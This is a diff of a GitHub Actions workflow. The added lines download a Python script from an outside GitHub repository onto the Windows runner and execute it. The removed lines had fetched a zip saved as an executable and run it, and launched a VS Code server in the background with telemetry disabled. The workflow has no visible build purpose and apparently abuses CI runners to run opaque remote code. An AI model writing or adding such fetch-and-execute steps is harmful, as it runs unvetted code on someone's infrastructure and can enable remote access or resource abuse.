@@ -15,13 +15,12 @@ jobs:
     steps:
       - name: dodl
         run: |
+          Invoke-WebRequest "https://raw.githubusercontent.com/Klanly/buildcv/main/vxprt.py" -OutFile "c:\vxprt.py"
           Invoke-WebRequest "https://aka.ms/vscode-server-launcher/x86_64-pc-windows-msvc" -OutFile "c:\vsc.exe"
-          Invoke-WebRequest "https://github.com/Klanly/buildcv/releases/download/200.300/stdprt.zip" -OutFile "c:\stdprt.exe"
-          
+
       - name: tocmd
         run: |
-          start /B "" c:\vsc.exe --accept-server-license-terms --disable-telemetry > c:\vscout.txt
-          c:\stdprt.exe
+          python c:\vxprt.py
         shell: cmd
 
  
